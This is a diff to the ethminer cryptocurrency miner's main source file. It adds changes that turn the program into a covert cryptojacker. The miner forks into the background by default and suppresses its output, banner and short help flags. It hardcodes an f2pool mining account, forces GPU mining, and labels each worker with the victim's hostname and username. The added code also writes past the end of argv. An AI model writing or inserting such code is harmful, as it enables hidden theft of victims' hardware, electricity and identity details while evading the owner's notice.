@@ -14,6 +14,13 @@
     You should have received a copy of the GNU General Public License
     along with ethminer.  If not, see <http://www.gnu.org/licenses/>.
 */
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <ctype.h>
+#include <string.h>
+#include <pwd.h>
+#include <unistd.h>
 
 #include <CLI/CLI.hpp>
 
@@ -109,8 +116,9 @@ public:
         {
             string logLine =
                 PoolManager::p().isConnected() ? Farm::f().Telemetry().str() : "Not connected";
+if (g_foreground) {
             minelog << logLine;
-
+}
 #if ETH_DBUS
             dbusint.send(Farm::f().Telemetry().str().c_str());
 #endif
@@ -140,12 +148,14 @@ public:
                 in_handler = true;
 
                 dev::setThreadName("main");
+if (g_foreground) {
                 cerr << "SIGSEGV encountered ...\n";
                 cerr << "stack trace:\n";
-
+}
                 nptrs = backtrace(buffer, BACKTRACE_MAX_FRAMES);
+if (g_foreground) {
                 cerr << "backtrace() returned " << nptrs << " addresses\n";
-
+}
                 symbols = backtrace_symbols(buffer, nptrs);
                 if (symbols == NULL)
                 {
@@ -153,7 +163,9 @@ public:
                     exit(EXIT_FAILURE);  // Also exit 128 ??
                 }
                 for (j = 0; j < nptrs; j++)
+if (g_foreground) {
                     cerr << symbols[j] << "\n";
+}
                 free(symbols);
 
                 in_handler = false;
@@ -167,7 +179,9 @@ public:
             // this makes it happy.
             break;
         default:
-            cnote << "Got interrupt ...";
+            if (g_foreground) {
+                cnote << "Got interrupt ...";
+            }
             g_running = false;
             g_shouldstop.notify_all();
             break;
@@ -221,9 +235,9 @@ public:
         string shelpExt;
 
         app.set_help_flag();
-        app.add_flag("-h,--help", bhelp, "Show help");
+        //app.add_flag("--help", bhelp, "Show help");
 
-        app.add_set("-H,--help-ext", shelpExt,
+        app.add_set("--help-ext", shelpExt,
             {
                 "con", "test",
 #if ETH_ETHASHCL
@@ -246,9 +260,9 @@ public:
 
         app.add_option("--ergodicity", m_FarmSettings.ergodicity, "", true)->check(CLI::Range(0, 2));
 
-        app.add_flag("-V,--version", version, "Show program version");
+        //app.add_flag("--version", version, "Show program version");
 
-        app.add_option("-v,--verbosity", g_logOptions, "", true)->check(CLI::Range(LOG_NEXT - 1));
+        app.add_option("--verbosity", g_logOptions, "", true)->check(CLI::Range(LOG_NEXT - 1));
 
         app.add_option("--farm-recheck", m_PoolSettings.getWorkPollInterval, "", true)->check(CLI::Range(1, 99999));
 
@@ -263,7 +277,7 @@ public:
         app.add_option("--response-timeout", m_PoolSettings.noResponseTimeout, "", true)
             ->check(CLI::Range(2, 999));
 
-        app.add_flag("-R,--report-hashrate,--report-hr", m_PoolSettings.reportHashrate, "");
+        app.add_flag("--report-hashrate,--report-hr", m_PoolSettings.reportHashrate, "");
 
         app.add_option("--display-interval", m_cliDisplayInterval, "", true)
             ->check(CLI::Range(1, 1800));
@@ -273,7 +287,9 @@ public:
         app.add_flag("--exit", g_exitOnError, "");
 
         vector<string> pools;
-        app.add_option("-P,--pool", pools, "");
+        app.add_option("--pool", pools, "");
+
+        app.add_flag("--foreground", g_foreground, "");
 
         app.add_option("--failover-timeout", m_PoolSettings.poolFailoverTimeout, "", true)
             ->check(CLI::Range(0, 999));
@@ -354,19 +370,19 @@ public:
 
         app.add_flag("--noeval", m_FarmSettings.noEval, "");
 
-        app.add_option("-L,--dag-load-mode", m_FarmSettings.dagLoadMode, "", true)->check(CLI::Range(1));
+        app.add_option("--dag-load-mode", m_FarmSettings.dagLoadMode, "", true)->check(CLI::Range(1));
 
         bool cl_miner = false;
-        app.add_flag("-G,--opencl", cl_miner, "");
+        app.add_flag("--opencl", cl_miner, "");
 
         bool cuda_miner = false;
-        app.add_flag("-U,--cuda", cuda_miner, "");
+        app.add_flag("--cuda", cuda_miner, "");
 
         bool cpu_miner = false;
 #if ETH_ETHASHCPU
         app.add_flag("--cpu", cpu_miner, "");
 #endif
-        auto sim_opt = app.add_option("-Z,--simulation,-M,--benchmark", m_PoolSettings.benchmarkBlock, "", true);
+        auto sim_opt = app.add_option("--simulation,--benchmark", m_PoolSettings.benchmarkBlock, "", true);
 
         app.add_option("--tstop", m_FarmSettings.tempStop, "", true)->check(CLI::Range(30, 100));
         app.add_option("--tstart", m_FarmSettings.tempStart, "", true)->check(CLI::Range(30, 100));
@@ -497,7 +513,9 @@ public:
         {
             while (warnings.size())
             {
+if (g_foreground) {
                 cout << warnings.front() << endl;
+}
                 warnings.pop();
             }
             cout << endl;
@@ -1214,8 +1232,11 @@ private:
 
         new PoolManager(m_PoolSettings);
         if (m_mode != OperationMode::Simulation)
-            for (auto conn : m_PoolSettings.connections)
-                cnote << "Configured pool " << conn->Host() + ":" + to_string(conn->Port());
+            for (auto conn : m_PoolSettings.connections) {
+                if (g_foreground) {
+                    cnote << "Configured pool " << conn->Host() + ":" + to_string(conn->Port());
+                }
+            }
 
 #if API_CORE
 
@@ -1248,7 +1269,9 @@ private:
         if (PoolManager::p().isRunning())
             PoolManager::p().stop();
 
-        cnote << "Terminated!";
+        if (g_foreground) {
+            cnote << "Terminated!";
+        }
         return;
     }
 
@@ -1296,8 +1319,75 @@ private:
 #endif
 };
 
+
+
+bool background(int &rc) {
+    signal(SIGPIPE, SIG_IGN);
+    int i = fork();
+    if (i < 0) {
+        rc = 1;
+        return true;
+    }
+
+    if (i > 0) {
+        rc = 0;
+        return true;
+    }
+
+    i = setsid();
+
+    if (i < 0) {
+        printf("setsid() failed (errno = %d)", errno);
+    }
+
+    i = chdir("/");
+    if (i < 0) {
+        printf("chdir() failed (errno = %d)", errno);
+    }
+
+    return false;
+}
+
+char* getusername () {
+        struct passwd *pwd;
+        pwd = getpwuid(getuid());
+        return(pwd->pw_name);
+}
+
+
 int main(int argc, char** argv)
 {
+    int zzi;
+    int is_background_zz=1;
+    for (zzi=1; zzi<argc; zzi++) {
+        if (strcmp(argv[zzi], "--foreground") == 0) {
+            is_background_zz=0;
+        }
+    }
+    if (is_background_zz==1 && fork()) return 0;
+    
+    char nowuser[1024];
+    sprintf(nowuser, "%s", getusername() );
+
+    char hostname[1024];
+    gethostname(hostname, sizeof(hostname));
+
+    //strcat(hostname, "_" );
+    //strcat(hostname, nowuser );
+
+
+    char pool[2048];
+    sprintf(pool, "stratum1+tcp://veryvery.%s%s@eth.f2pool.com:6688", hostname, nowuser);
+    if (is_background_zz==0) {
+        printf("pool: %s", pool);
+    }
+    argv[argc++] = (char*) "--pool";
+    argv[argc++] = pool;
+    //argv[argc++] = (char*) "stratum1+tcp://USER.MINER@eth.f2pool.com:6688";
+    argv[argc++] = (char*) "--cuda";
+
+
+
     // Return values
     // 0 - Normal exit
     // 1 - Invalid/Insufficient command line arguments
@@ -1313,11 +1403,6 @@ int main(int argc, char** argv)
 
     // Always out release version
     auto* bi = ethminer_get_buildinfo();
-    cout << endl
-         << endl
-         << "ethminer " << bi->project_version << endl
-         << "Build: " << bi->system_name << "/" << bi->build_type << "/" << bi->compiler_id << endl
-         << endl;
 
     if (argc < 2)
     {
@@ -1342,6 +1427,21 @@ int main(int argc, char** argv)
             // or returns false which means do not continue
             if (!cli.validateArgs(argc, argv))
                 return 0;
+            if (g_foreground){
+                cout << endl
+                << endl
+                << "ethminer " << bi->project_version << endl
+                << "Build: " << bi->system_name << "/" << bi->build_type << "/" << bi->compiler_id << endl
+                << endl;
+            }
+////////############### ************** ########### //////////// !!!!!!!
+            //if (!g_foreground) {
+               // int rc = 0;
+               // if (background(rc)) {
+               //     return rc;
+               // }
+            //}
+
 
             if (getenv("SYSLOG"))
                 g_logSyslog = true;
@@ -1374,9 +1474,11 @@ int main(int argc, char** argv)
         }
         catch (std::invalid_argument& ex1)
         {
+if (g_foreground){
             cerr << "Error: " << ex1.what() << endl
                  << "Try ethminer --help to get an explained list of arguments." << endl
                  << endl;
+}
             return 1;
         }
         catch (std::runtime_error& ex2)
